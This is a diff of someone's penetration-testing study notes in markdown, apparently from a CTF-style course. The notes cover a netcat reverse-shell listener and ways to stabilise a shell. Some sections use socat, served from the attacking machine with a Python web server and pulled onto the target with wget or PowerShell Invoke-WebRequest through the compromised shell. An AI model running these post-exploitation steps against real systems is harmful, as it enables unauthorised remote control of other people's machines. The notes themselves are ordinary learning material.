@@ -141,7 +141,8 @@ ssh muri@localhost
 ## Netcat
 ### Reverse Shells
 * Syntax for starting a netcat listener using Linux.
-```nc -lvnp <port-number>
+```
+nc -lvnp <port-number>
 ```
   * **`-l`** this will be a listener.
   * **`-v`** request a verbose output.
@@ -218,22 +219,32 @@ rlwrap nc -lvnp <port>
   * `stty raw -echo; fg` to stabilise and re-enter the shell.
 
 #### Technique 3: Socat
-* The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell.
-* Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell.
-* To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine.
-* A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (sudo python3 -m http.server 80), then, on the target machine, using the netcat shell to download the file.
-* On Linux this would be accomplished with curl or wget (wget <LOCAL-IP>/socat -O /tmp/socat).
-* In a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe).
-* With any of the above techniques, it's useful to be able to change your terminal tty size.
-* This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.
-* First, open another terminal and run stty -a.
-* This will give you a large stream of output. Note down the values for "rows" and columns:
-* Next, in your reverse/bind shell, type in: stty rows <number> and stty cols <number>
-Filling in the numbers you got from running the command in your own terminal.
-This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.
+* Use an initial netcat shell as a stepping stone into a more fully-featured socat shell.
+* Limited to Linux targets.
+  * Socat shell on Windows will be no more stable than a netcat shell.
+* Transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine.
+  * Use a webserver on the attacking machine inside the directory containing the socat binary.
+```
+sudo python3 -m http.server 80
+```
+  * Use the netcat shell to download the file on the target machine.
+```
+wget <LOCAL-IP>/socat -O /tmp/socat).
+```
+* In a Windows environment the same can be done with Powershell.
+```
+Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe)
+```
+* Useful to be able to change the terminal tty size.
+  * Must be done manually in a reverse or bind shell.
+  * Open another terminal and run `stty -a`.
+    * Note down the values for rows and columns.
+  * In the reverse/bind shell type in `stty rows <number> and stty cols <number>`.
+    * This will change the registered width and height of the terminal.
+    * Allows programs such as text editors that rely on such information being accurate to correctly open.
 
 ## Socat
-* The easiest way to think about socat is as a connector between two points.
+* Connector between two points.
 * This will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports.
 * All socat does is provide a link between two points.
 
